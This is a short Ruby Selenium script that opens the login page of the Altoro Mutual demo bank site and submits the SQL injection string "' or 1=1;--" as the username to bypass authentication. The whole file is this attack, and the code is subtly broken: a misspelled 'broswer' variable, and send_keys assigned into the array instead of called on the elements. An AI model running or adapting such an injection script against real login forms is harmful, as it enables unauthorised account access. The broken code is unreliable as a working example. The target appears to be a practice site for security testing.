#!/usr/bin/env ruby

require 'selenium-webdriver'

browser = Selenium::WebDriver.for :chrome
browser.get "http://www.altoromutual.com/bank/login.aspx"

wait = Selenium::WebDriver::Wait.new(:timeout => 15) #set waiting timeout
input = wait.until {
  element_user = broswer.find_element(:name, "uid")
  element_pass = browser.find_element(:name, "passw")
  #return array of elements when found
  [element_user, element_pass] if element_user.displayed? and element_pass.displayed?
}

input[0] = send_keys("' or 1=1;--") #Send key for 1st element
input[1] = send_keys("password")    #send key for next element
sleep 2

#click button

submit = browser.find_element(:name, "btnSubmit").click

#browser.quit
